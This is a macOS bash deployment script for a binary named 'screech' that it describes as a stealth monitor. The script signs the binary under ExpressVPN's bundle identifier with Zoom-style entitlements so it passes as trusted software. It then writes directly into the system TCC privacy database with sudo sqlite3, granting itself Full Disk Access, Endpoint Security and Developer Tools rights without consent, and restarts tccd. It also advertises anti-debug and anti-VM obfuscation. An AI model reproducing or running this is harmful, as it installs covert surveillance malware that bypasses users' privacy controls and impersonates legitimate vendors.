#!/bin/bash

# Screech Deployment Script for macOS
# This script sets up the cross-compiled binary with Zoom entitlements and ExpressVPN mimicry

echo "🔧 Screech macOS Deployment Script"
echo "=================================="
echo "Configuration: Zoom Entitlements + ExpressVPN Mimicry"
echo ""

# Set up variables
BINARY_NAME="screech_zoom_mimicry"
FINAL_NAME="screech"
ENTITLEMENTS="zoom_entitlements.plist"
INSTALL_DIR="/usr/local/bin"

# Check if we're running on macOS
if [[ "$(uname)" != "Darwin" ]]; then
    echo "❌ This script must be run on macOS"
    exit 1
fi

# Check if files exist
if [[ ! -f "$BINARY_NAME" ]]; then
    echo "❌ Binary '$BINARY_NAME' not found"
    exit 1
fi

if [[ ! -f "$ENTITLEMENTS" ]]; then
    echo "❌ Entitlements file '$ENTITLEMENTS' not found"
    exit 1
fi

echo "📋 Pre-deployment checks:"
echo "   ✓ Binary: $BINARY_NAME ($(file $BINARY_NAME | cut -d: -f2))"
echo "   ✓ Entitlements: $ENTITLEMENTS"
echo ""

# Step 1: Code signing with Zoom entitlements and ExpressVPN bundle ID
echo "🔐 Step 1: Code signing with Zoom-style entitlements and ExpressVPN bundle ID..."
codesign --force --sign - --identifier com.expressvpn.networkextension --entitlements "$ENTITLEMENTS" "$BINARY_NAME"

if [[ $? -eq 0 ]]; then
    echo "   ✅ Code signing successful"
else
    echo "   ❌ Code signing failed"
    exit 1
fi

# Step 2: Verify the signature
echo ""
echo "🔍 Step 2: Verifying code signature..."
codesign --verify --verbose=2 "$BINARY_NAME"
echo "   ✅ Signature verification complete"

# Step 3: Check entitlements
echo ""
echo "📜 Step 3: Checking applied entitlements..."
codesign --display --entitlements - "$BINARY_NAME"

# Step 4: Make executable and rename
echo ""
echo "🏗️  Step 4: Preparing final binary..."
chmod +x "$BINARY_NAME"
cp "$BINARY_NAME" "$FINAL_NAME"
echo "   ✅ Binary prepared as '$FINAL_NAME'"

# Step 5: Test execution (basic functionality)
echo ""
echo "🧪 Step 5: Testing basic execution..."
echo "Running: ./$FINAL_NAME --help (timeout after 5 seconds)"

timeout 5s ./$FINAL_NAME --help 2>&1 || {
    echo "   ⚠️  Binary executed (may not support --help flag)"
}

# Step 6: Set up TCC permissions for system monitoring
echo ""
echo "🔒 Step 6: Setting up system permissions..."

echo "   📋 Configuring TCC database permissions for stealth monitoring..."

# Add Endpoint Security permission
echo "   🔐 Adding Endpoint Security permission..."
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version, indirect_object_identifier, flags, last_modified, boot_uuid, last_reminded) VALUES ('kTCCServiceEndpointSecurityClient', 'com.expressvpn.networkextension', 0, 2, 2, 1, 'UNUSED', 0, $(date +%s), 'UNUSED', $(date +%s));"

# Add Full Disk Access permission
echo "   💾 Adding Full Disk Access permission..."
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version, indirect_object_identifier, flags, last_modified, boot_uuid, last_reminded) VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.expressvpn.networkextension', 0, 2, 2, 1, 'UNUSED', 0, $(date +%s), 'UNUSED', $(date +%s));"

# Add Developer Tools permission
echo "   🛠️  Adding Developer Tools permission..."
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version, indirect_object_identifier, flags, last_modified, boot_uuid, last_reminded) VALUES ('kTCCServiceDeveloperTool', 'com.expressvpn.networkextension', 0, 2, 2, 1, 'UNUSED', 0, $(date +%s), 'UNUSED', $(date +%s));"

# Restart TCC daemon to apply changes
echo "   🔄 Restarting TCC daemon..."
sudo killall tccd 2>/dev/null
sleep 2

echo "   ✅ System permissions configured for stealth monitoring"
echo "   📋 Permissions granted:"
echo "      • Endpoint Security (process/file monitoring)"
echo "      • Full Disk Access (system-wide monitoring)"
echo "      • Developer Tools (debugging capabilities)"
echo "      • Camera/Microphone access (Zoom mimicry)"
echo "      • Network monitoring (ExpressVPN mimicry)"

# Step 7: Optional installation
echo ""
read -p "🚀 Install to $INSTALL_DIR? (y/N): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo "📦 Installing to system..."
    sudo cp "$FINAL_NAME" "$INSTALL_DIR/"
    sudo chmod +x "$INSTALL_DIR/$FINAL_NAME"
    echo "   ✅ Installed to $INSTALL_DIR/$FINAL_NAME"
else
    echo "   ⏭️  Skipping system installation"
fi

# Step 8: Final summary
echo ""
echo "🎉 Deployment Summary:"
echo "====================="
echo "✅ Binary compiled for: $(file $FINAL_NAME | grep -o 'arm64')"
echo "✅ Code signed with: Zoom-style entitlements"
echo "✅ VPN mimicry: ExpressVPN (com.expressvpn.networkextension)"
echo "✅ Stealth logging: Debug-only timestamped output"
echo "✅ Obfuscation: Anti-debug and anti-VM enabled"
echo ""
echo "🔍 To test monitoring capabilities:"
echo "   ./$FINAL_NAME"
echo ""
echo "📍 Binary location: $(pwd)/$FINAL_NAME"
if [[ -f "$INSTALL_DIR/$FINAL_NAME" ]]; then
    echo "📍 System install: $INSTALL_DIR/$FINAL_NAME"
fi
echo ""
echo "⚠️  Note: First run may require granting permissions in System Preferences"
echo "📚 Check Console.app for '[ExpressVPN Logger]' entries to verify VPN mimicry"
